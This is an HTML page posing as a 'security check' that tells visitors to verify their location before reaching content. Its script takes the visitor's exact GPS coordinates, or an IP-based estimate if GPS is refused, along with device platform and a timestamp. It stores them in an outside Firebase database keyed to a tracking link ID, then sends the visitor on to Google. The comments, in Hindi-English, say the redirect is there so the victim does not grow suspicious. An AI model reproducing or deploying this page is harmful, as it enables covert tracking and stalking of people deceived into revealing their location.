<!DOCTYPE html>
<html lang="en">
<head>
<meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; 
            display: flex; justify-content: center; align-items: center; height: 100vh; 
            flex-direction: column; text-align: center; padding: 20px;
            background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        .container {
            background: #111; border: 1px solid #333; padding: 30px 20px; border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); max-width: 400px; width: 100%;
        }
        .loader { 
            border: 4px solid #222; border-top: 4px solid #00ff41; border-radius: 50%; 
            width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #00ffff; margin-bottom: 10px; font-size: 18px; letter-spacing: 1px; }
        p { font-size: 13px; color: #888; margin-bottom: 20px; line-height: 1.5; }
        .btn { 
            background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; color: #00ff41; 
            padding: 15px 20px; font-family: 'JetBrains Mono', monospace; font-size: 15px; 
            font-weight: bold; cursor: pointer; border-radius: 8px; width: 100%;
            transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
        }
        .btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.5); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader" id="loader"></div>
        
        <div id="step-1">
            <h2>SECURITY CHECK</h2>
            <p>This link is protected. Please verify your location to continue to the content.</p>
            <button class="btn" onclick="startTracking()">Verify Location</button>
        </div>

        <div id="step-2" class="hidden">
            <h2 style="color: #00ff41;">LOCATION VERIFIED</h2>
            <p id="status-msg">Fetching GPS satellites...</p>
            <div class="loader" style="border-top-color: #00ffff;"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // TUMHARI FIREBASE CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyBqOqV3gztxR8xNx1biOn9o7rvjkiHH16o",
            authDomain: "fuckedbyhyperapp.firebaseapp.com",
            databaseURL: "https://fuckedbyhyperapp-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "fuckedbyhyperapp",
            storageBucket: "fuckedbyhyperapp.firebasestorage.app",
            messagingSenderId: "480408008111",
            appId: "1:480408008111:web:0eb411fe713ff5c19ceb5a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // URL se Link ID nikaalo (jo admin panel se generate hui thi)
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id') || 'default';

        window.startTracking = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // EXACT GPS MIL GAYI
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        document.getElementById('status-msg').innerText = "Location Verified! Redirecting...";
                        
                        saveData(lat, lng, "GPS_Exact", accuracy);
                    },
                    (error) => {
                        // USER NE BLOCK KAR DIYA YA ERROR
                        document.getElementById('status-msg').innerText = "GPS Failed. Using IP fallback...";
                        fetchIPLocation();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                fetchIPLocation();
            }
        };

        // Agar user GPS block kare toh IP se approximate location nikaalo
        async function fetchIPLocation() {
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();
                if(data.success) {
                    saveData(data.latitude, data.longitude, "IP_Approx", 5000);
                } else {
                    window.location.href = "https://www.google.com";
                }
            } catch (e) {
                window.location.href = "https://www.google.com";
            }
        }

        async function saveData(lat, lng, type, accuracy) {
            const trackData = {
                lat: lat,
                lng: lng,
                type: type, // Batayega ki exact GPS hai ya IP
                accuracy: accuracy,
                device: navigator.platform || "Unknown",
                timestamp: Date.now()
            };

            // Firebase me save karo
            await set(ref(db, 'tracking_links/' + linkId), trackData);
            
            // Kaam hone ke baad user ko Google par redirect kar do (Taaki shaq na ho)
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1500);
        }
    </script>
</body>
</html>
